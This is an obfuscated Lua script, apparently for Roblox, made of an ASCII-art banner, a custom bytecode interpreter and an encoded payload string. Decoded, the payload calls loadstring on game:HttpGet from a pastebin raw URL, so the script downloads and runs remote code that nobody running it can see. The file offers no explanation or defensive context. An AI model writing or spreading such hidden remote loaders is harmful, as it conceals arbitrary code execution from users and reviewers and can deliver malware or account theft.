--[[

  o8boooo    8888 888        ,d8PPPP   888  888 ,8b.     88888888    d88PPPo   ,d8PPPP   ,d8PPPP 888  ,d8   8888PPPp,   ,dbPPPp 88888888 888888888   ,d8PPPP doooooo 888888888   ,d8PPPP   88PPP.   d88PPPo 888   88   99901001    88PPP.    8888 88888888  doooooo 88888888   ,dbPPPp   88PPP.        d8p PPPPP88p'888888888 8888PPPp,   ,dbPPPp 88888888 
  88booop    8888 888        d88ooo    88888888 88'8o    88ooooPp    888ooo8   d88ooo    d88ooo  888_dPY8   8888    8   d88ooP' 888  888    '88d     d88ooo  d88        '88d     d88ooo    88   8   888ooo8 888ooo88               88   8    8888 88ooooPp  d88     888  888   d88ooP'   88   8        88p     ,dP'    '88d   8888    8   d88ooP' 888  888 
  88b        8888 888      ,88'        88P  888 88PPY8.         d8   888   8 ,88'      ,88'      8888' 88   8888PPPP' ,88' P'   888  888   '888    ,88'      d88       '888    ,88'        88   8   888   8       88               88   8    8888        d8 d88     888  888 ,88' P'     88   8        88P   ,dP'     '888    8888PPPP' ,88' P'   888  888 
  88P        8888 888PPPPP 88bdPPP     88P  888 8b   `Y' 8888888P    888PPPP 88bdPPP   88bdPPP   Y8P   Y8   888P      88  do    888oo888 '88p      88bdPPP   d888888 '88p      88bdPPP     88oop'   888PPPP PPPPPP8P               88oop'    8888 8888888P  d888888 888oo888 88  do      88oop'     88888' YPPPPPPP '88p      888P      88  do    888oo888 
                                                                                                              _  _                                                                                                                                                                                                               _  _                       

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v86=v2(v0(v30,16));if v19 then local v105=v5(v86,v19);v19=nil;return v105;else return v86;end end end);local function v20(v31,v32,v33) if v33 then local v87=(v31/(2^(v32-1)))%((5 -3)^(((v33-(2 -1)) -(v32-(1 -0))) + (928 -(214 + 713)))) ;return v87-(v87%(2 -1)) ;else local v88=(621 -((2192 -(1523 + 114)) + 64))^(v32-1) ;return (((v31%(v88 + v88))>=v88) and (932 -(857 + 67 + 7))) or 0 ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35,v36=v1(v16,v18,v18 + (2 -0) );v18=v18 + 2 ;return (v36 * (1321 -(68 + 997))) + v35 ;end local function v23() local v37,v38,v39,v40=v1(v16,v18,v18 + (1273 -(226 + 232 + 812)) );v18=v18 + (17 -13) ;return (v40 * (16777333 -(32 + 85))) + (v39 * (64226 + 1310)) + (v38 * 256) + v37 ;end local function v24() local v41=v23();local v42=v23();local v43=1;local v44=(v20(v42,958 -((1950 -1058) + 65) ,(9 + 38) -27 ) * ((3 -1)^((102 -44) -26))) + v41 ;local v45=v20(v42,21,381 -(87 + 263) );local v46=((v20(v42,212 -(67 + 113) )==(1 + 0 + 0)) and  -(2 -1)) or ((792 -(368 + 423)) + 0) ;if (v45==(0 -(0 -0))) then if (v44==0) then return v46 * (952 -(802 + 150)) ;else local v106=0 -0 ;while true do if (v106==(0 -0)) then v45=1 + 0 ;v43=997 -(915 + 82) ;break;end end end elseif (v45==(2065 -(10 + 8))) then return ((v44==(0 -0)) and (v46 * ((1 + 0)/(0 -0)))) or (v46 * NaN) ;end return v8(v46,v45-((8501 -6291) -(1069 + (560 -(416 + 26)))) ) * (v43 + (v44/((4 -2)^52))) ;end local function v25(v47) local v48;if  not v47 then v47=v23();if (v47==(0 -0)) then return "";end end v48=v3(v16,v18,(v18 + v47) -(1 + 0) );v18=v18 + v47 ;local v49={};for v65=1, #v48 do v49[v65]=v2(v1(v3(v48,v65,v65)));end return v6(v49);end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v50=(function() return function(v89,v90,v91,v92,v93,v94,v95,v96) local v89=(function() return 254 -(163 + 91) ;end)();local v90=(function() return;end)();local v92=(function() return;end)();while true do if (v89~=(1930 -(1869 + 61))) then else local v111=(function() return 0;end)();local v112=(function() return;end)();while true do if (v111~=0) then else v112=(function() return 0;end)();while true do if (v112==(1 + 0)) then v89=(function() return  #"{";end)();break;end if (v112==0) then v90=(function() return v91();end)();v92=(function() return nil;end)();v112=(function() return 1;end)();end end break;end end end if (v89~= #"\\") then else if (v90== #"\\") then v92=(function() return v91()~=(0 -0) ;end)();elseif (v90==2) then v92=(function() return v93();end)();elseif (v90== #"gha") then v92=(function() return v94();end)();end v95[v96]=(function() return v92;end)();break;end end return v89,v90,v91,v92,v93,v94,v95,v96;end;end)();local v51=(function() return function(v97,v98,v99) local v100=(function() return 0;end)();local v101=(function() return;end)();while true do if (v100==(0 -0)) then v101=(function() return 0 + 0 ;end)();while true do if (v101==(0 -0)) then v97[v98-#"!" ]=(function() return v99();end)();return v97,v98,v99;end end break;end end end;end)();local v52=(function() return {};end)();local v53=(function() return {};end)();local v54=(function() return {};end)();local v55=(function() return {v52,v53,nil,v54};end)();local v56=(function() return v23();end)();local v57=(function() return {};end)();for v67= #"!",v56 do FlatIdent_12703,Type,v21,Cons,v24,v25,v57,v67=(function() return v50(FlatIdent_12703,Type,v21,Cons,v24,v25,v57,v67);end)();end v55[ #"nil"]=(function() return v21();end)();for v68= #"!",v23() do local v69=(function() return 0;end)();local v70=(function() return;end)();while true do if (v69~=(1474 -(1329 + 145))) then else v70=(function() return v21();end)();if (v20(v70, #"]", #"[")==(971 -(140 + 831))) then local v114=(function() return 1850 -(1409 + 441) ;end)();local v115=(function() return;end)();local v116=(function() return;end)();local v117=(function() return;end)();while true do if (v114~=(719 -(15 + 703))) then else v117=(function() return {v22(),v22(),nil,nil};end)();if (v115==0) then local v121=(function() return 0;end)();local v122=(function() return;end)();while true do if (v121==0) then v122=(function() return 0;end)();while true do if (v122==0) then v117[ #"xxx"]=(function() return v22();end)();v117[ #".dev"]=(function() return v22();end)();break;end end break;end end elseif (v115== #"!") then v117[ #"xnx"]=(function() return v23();end)();elseif (v115==2) then v117[ #"nil"]=(function() return v23() -((440 -(262 + 176))^(1737 -(345 + 1376))) ;end)();elseif (v115~= #"91(") then else local v216=(function() return 688 -(198 + 490) ;end)();local v217=(function() return;end)();while true do if (v216==0) then v217=(function() return 0;end)();while true do if (v217==(0 -0)) then v117[ #"-19"]=(function() return v23() -(2^16) ;end)();v117[ #"xnxx"]=(function() return v22();end)();break;end end break;end end end v114=(function() return 2;end)();end if (v114~=(6 -3)) then else if (v20(v116, #"-19", #"19(")== #"\\") then v117[ #".dev"]=(function() return v57[v117[ #"0836"]];end)();end v52[v68]=(function() return v117;end)();break;end if (v114==(1208 -(696 + 510))) then if (v20(v116, #"]", #"\\")== #",") then v117[2]=(function() return v57[v117[3 -1 ]];end)();end if (v20(v116,2,1264 -(1091 + 171) )== #"[") then v117[ #"xnx"]=(function() return v57[v117[ #"asd"]];end)();end v114=(function() return 3;end)();end if (v114~=(0 + 0)) then else local v120=(function() return 0 -0 ;end)();while true do if (v120==1) then v114=(function() return 1;end)();break;end if (v120==(0 -0)) then local v126=(function() return 0;end)();while true do if (v126~=(375 -(123 + 251))) then else v120=(function() return 1;end)();break;end if (v126~=(0 -0)) then else v115=(function() return v20(v70,700 -(208 + 490) , #"xnx");end)();v116=(function() return v20(v70, #"asd1",1 + 5 );end)();v126=(function() return 1;end)();end end end end end end end break;end end end for v71= #"~",v23() do v53,v71,v28=(function() return v51(v53,v71,v28);end)();end return v55;end local function v29(v59,v60,v61) local v62=v59[1 + 0 ];local v63=v59[2];local v64=v59[2 + 1 ];return function(...) local v72=v62;local v73=v63;local v74=v64;local v75=v27;local v76=1 + 0 ;local v77= -(837 -(660 + 176));local v78={};local v79={...};local v80=v12("#",...) -(203 -(14 + 188)) ;local v81={};local v82={};for v102=675 -(534 + 141) ,v80 do if ((v102>=v74) or (1991<1068)) then v78[v102-v74 ]=v79[v102 + 1 + 0 ];else v82[v102]=v79[v102 + 1 + 0 ];end end local v83=(v80-v74) + 1 + (0 -0) ;local v84;local v85;while true do v84=v72[v76];v85=v84[1 -0 ];if ((2053<=4859) and (v85<=(35 -16))) then if (v85<=(18 -9)) then if ((v85<=(5 -1)) or (4261<2017)) then if (v85<=(2 -1)) then if (v85==(0 + 0)) then local v127=v84[2 + 0 ];do return v13(v82,v127,v127 + v84[399 -(115 + (1774 -(711 + 782))) ] );end else v82[v84[2]]=v82[v84[6 -3 ]] + v84[4 + 0 ] ;end elseif ((4716>80) and (v85<=(4 -2))) then v82[v84[7 -(9 -4) ]]();elseif (v85==(870 -(550 + 317))) then v82[v84[2 -0 ]]=v84[1583 -(1183 + 397) ]/v84[4 -0 ] ;else v82[v84[(474 -(270 + 199)) -3 ]]=v84[8 -5 ];end elseif ((v85<=((95 + 196) -(134 + 151))) or (3507==3272)) then if (v85==(1670 -((2789 -(580 + 1239)) + 695))) then v82[v84[3 -1 ]]=v84[2 + 1 ]/v84[1994 -(582 + 1408) ] ;else do return v82[v84[6 -4 ]];end end elseif (v85<=((23 -15) -1)) then v82[v84[7 -5 ]]=v84[(1592 + 72) -(1477 + 184) ]~=(0 -0) ;elseif (v85>((66 + 1766) -(1195 + 629))) then for v196=v84[2 -0 ],v84[244 -(187 + 54) ] do v82[v196]=nil;end else v76=v84[783 -(162 + 618) ];end elseif ((v85<=14) or (876>=3075)) then if ((4352>2554) and (v85<=(8 + 2 + 1))) then if ((v85==(7 + (7 -4))) or (4406<4043)) then if (v82[v84[2]]==v84[8 -4 ]) then v76=v76 + ((1 + 0) -0) ;else v76=v84[1 + (1169 -(645 + 522)) ];end else local v131=1636 -(1373 + (2053 -(1010 + 780))) ;local v132;while true do if (v131==(1000 -(451 + 549))) then v132=v84[2];v82[v132]=v82[v132](v13(v82,v132 + 1 + 0 ,v84[1616 -(1565 + 48) ]));break;end end end elseif ((v85<=(18 -(6 + 0))) or (1889>=3383)) then v82[v84[2 -0 ]]=v84[270 -(176 + 91) ];elseif (v85>(1397 -(746 + (3039 -2401)))) then v61[v84[2 + 1 ]]=v82[v84[2 -0 ]];else local v178=v84[(1005 -662) -(218 + 123) ];local v179={};for v200=1582 -(1535 + 46) , #v81 do local v201=v81[v200];for v205=0 + 0 , #v201 do local v206=v201[v205];local v207=v206[1 + 0 ];local v208=v206[562 -(306 + 254) ];if ((1892<=2734) and (v207==v82) and (v208>=v178)) then v179[v208]=v207[v208];v206[1 + 0 ]=v179;end end end end elseif ((1923<2218) and (v85<=(30 -14))) then if (v85==(1482 -(899 + 568))) then local v135=v73[v84[10 -7 ]];local v136;local v137={};v136=v10({},{__index=function(v158,v159) local v160=v137[v159];return v160[1019 -(697 + 321) ][v160[2 + 0 ]];end,__newindex=function(v161,v162,v163) local v164=v137[v162];v164[1][v164[4 -2 ]]=v163;end});for v166=604 -(268 + 335) ,v84[294 -(60 + 230) ] do local v167=572 -(426 + 146) ;local v168;while true do if (v167==(1 + 0)) then if (v168[(3293 -(1045 + 791)) -((713 -431) + 1174) ]==(831 -(569 + 242))) then v137[v166-(1228 -(322 + (1381 -476))) ]={v82,v168[1 + 2 ]};else v137[v166-(1025 -(706 + 318)) ]={v60,v168[7 -4 ]};end v81[ #v81 + (267 -(28 + 238)) + 0 ]=v137;break;end if (v167==(0 -0)) then v76=v76 + (701 -(271 + 429)) ;v168=v72[v76];v167=1 + 0 ;end end end v82[v84[3 -1 ]]=v29(v135,v136,v61);else v76=v84[1503 -(1408 + 92) ];end elseif ((2173>379) and (v85<=(1103 -(461 + 625)))) then v82[v84[2]]();elseif (v85>(1306 -(993 + (658 -363)))) then local v180=0 + 0 ;local v181;while true do if (v180==(1171 -(418 + (2312 -(1381 + 178))))) then v181=v84[1 + 1 ];v82[v181](v82[v181 + 1 + 0 ]);break;end end else do return v82[v84[216 -(22 + 192) ]];end end elseif ((v85<=(712 -(454 + 29 + 200))) or (2591==3409)) then if (v85<=(8 + 16)) then if (v85<=(6 + 15)) then if (v85==(54 -34)) then v82[v84[531 -(406 + 123) ]]=v82[v84[(1429 + 343) -(1749 + 20) ]];else v60[v84[1 + 2 ]]=v82[v84[1324 -(533 + 716 + 73) ]];end elseif (v85<=(74 -52)) then local v144=0 + 0 ;local v145;local v146;while true do if (v144==(1146 -(466 + 679))) then for v211=1 -0 , #v81 do local v212=v81[v211];for v219=0 -0 , #v212 do local v220=v212[v219];local v221=v220[1 + 0 ];local v222=v220[5 -(10 -7) ];if ((v221==v82) and (v222>=v145)) then v146[v222]=v221[v222];v220[1 + 0 ]=v146;end end end break;end if ((4514>3324) and ((0 -0)==v144)) then v145=v84[4 -2 ];v146={};v144=1901 -(106 + 1794) ;end end elseif ((v85==(62 -39)) or (208>=4828)) then v82[v84[1 + 1 ]]=v84[1 + 2 ] + v82[v84[11 -7 ]] ;else local v183=0 -0 ;local v184;local v185;local v186;while true do if (v183==(164 -(92 + 37 + 34))) then v186={};v185=v10({},{__index=function(v230,v231) local v232=v186[v231];return v232[115 -(4 + 110) ][v232[586 -(57 + 527) ]];end,__newindex=function(v233,v234,v235) local v236=v186[v234];v236[1428 -(41 + 1386) ][v236[105 -(17 + 86) ]]=v235;end});v183=2 + 0 ;end if (((3 -1)==v183) or (1583>3567)) then for v238=1 + 0 ,v84[11 -7 ] do local v239=126 -(55 + 71) ;local v240;while true do if ((v239==(166 -(122 + (74 -30)))) or (1313==794)) then v76=v76 + (1 -0) ;v240=v72[v76];v239=3 -(1158 -(1074 + 82)) ;end if ((3174>2902) and (v239==(1 + 0))) then if ((4120<=4260) and (v240[(1 -0) -0 ]==(959 -(714 + (2009 -(214 + 1570)))))) then v186[v238-(2 -1) ]={v82,v240[5 -2 ]};else v186[v238-(66 -(30 + 35)) ]={v60,v240[3]};end v81[ #v81 + 1 + 0 ]=v186;break;end end end v82[v84[2 + 0 + 0 ]]=v29(v184,v185,v61);break;end if ((v183==(0 -0)) or (883>4778)) then v184=v73[v84[1260 -(1043 + 214) ]];v185=nil;v183=1 + 0 ;end end end elseif ((v85<=(98 -(283 -211))) or (3620>=4891)) then if (v85==(1237 -(323 + 889))) then v82[v84[5 -3 ]]=v82[v84[583 -(361 + 219) ]];else v82[v84[287 -(175 + 110) ]]=v61[v84[(2049 -(1668 + 58)) -(53 + 267) ]];end elseif ((4258>937) and (v85<=(7 + 20))) then v82[v84[415 -(15 + 398) ]]=v29(v73[v84[(1611 -(512 + 114)) -(18 + 964) ]],nil,v61);elseif ((v85>(105 -77)) or (4869<906)) then v82[v84[2 + 0 ]]=v84[2 + 1 ]~=(850 -(20 + (2163 -1333))) ;else local v188=v84[2 + (0 -0) ];v82[v188](v82[v188 + 1 + 0 ]);end elseif ((v85<=(160 -(116 + 10))) or (1225>4228)) then if (v85<=(3 + 28)) then if (v85>(563 -(43 + 490))) then v82[v84[740 -(542 + 196) ]]=v29(v73[v84[6 -3 ]],nil,v61);else for v169=v84[(3 -2) + 1 ],v84[1 + 1 + 1 ] do v82[v169]=nil;end end elseif ((3328>2238) and (v85<=(50 -(4 + 14)))) then v82[v84[1 + 1 ]]=v84[7 -4 ] + v82[v84[9 -5 ]] ;elseif (v85>(1584 -(1126 + 425))) then v82[v84[407 -(118 + 287) ]]=v61[v84[2 + 1 ]];elseif ((3839>1405) and (v82[v84[(7 + 0) -5 ]]==v84[1125 -(118 + 1003) ])) then v76=v76 + (2 -(3 -2)) ;else v76=v84[9 -6 ];end elseif (v85<=((3770 -(109 + 1885)) -(404 + 1335))) then if ((v85<=(412 -(142 + 235))) or (1293<=507)) then local v154=0 -0 ;local v155;while true do if (v154==(0 + 0)) then v155=v84[979 -(553 + 424) ];v82[v155]=v82[v155](v13(v82,v155 + (1 -0) ,v84[3 + 0 ]));break;end end elseif (v85==(36 + 0)) then v61[v84[2 + 1 ]]=v82[v84[(1470 -(1269 + 200)) + 1 ]];else v60[v84[2 + 1 ]]=v82[v84[4 -2 ]];end elseif (v85<=(105 -67)) then v82[v84[1 + 1 ]]=v82[v84[6 -3 ]] + v84[2 + 2 ] ;elseif (v85==(188 -149)) then do return;end else do return;end end v76=v76 + (754 -(239 + 514)) ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!0D3Q0003193Q00492Q6C493Q6C492Q6C493Q6C493Q6C493Q6C492Q6C028Q00026Q001840026Q003440026Q002240026Q005940030F3Q00492Q6C4Q492Q6C5Q496C024Q0076792B4103233Q00492Q6C493Q6C492Q6C493Q6C493Q6C493Q6C492Q6C493Q6C3Q493Q6C024Q0080BDC140030A3Q006C6F6164737472696E67033F3Q006C6F6164737472696E672867616D653A482Q74704765742822682Q7470733A2Q2F706173746562696E2E636F6D2F7261772F63644C5636355070222Q29282903183Q008Q498Q6C8Q49001A3Q00021B7Q0012243Q00013Q0030053Q000300020010173Q00043Q0020265Q0005001204000100063Q00021B000200013Q001224000200073Q001222000200073Q001204000300084Q001300020002000100060F00020002000100012Q00147Q001224000200093Q001222000200093Q0012040003000A4Q00130002000200010012220002000B3Q0012040003000C4Q0019000400024Q0019000500033Q0012220006000D4Q000B0004000600022Q00020004000100012Q00168Q00283Q00013Q00033Q00033Q00028Q00025Q00B89C40025Q00409E4001143Q001204000100014Q0009000200023Q00262100010002000100010004103Q00020001001204000200013Q00262100020005000100010004103Q000500010026213Q000B000100020004103Q000B00012Q000700036Q0012000300023Q0026213Q0013000100030004103Q001300012Q0007000300014Q0012000300023Q0004103Q001300010004103Q000500010004103Q001300010004103Q000200012Q00283Q00019Q002Q0001023Q00021B8Q00283Q00013Q00017Q0001023Q00021B8Q00283Q00013Q00017Q002Q014Q00283Q00019Q002Q0001033Q00021B00016Q002500016Q00283Q00013Q00013Q00013Q00026Q332F4001023Q001204000100014Q00283Q00017Q00",v9(),...);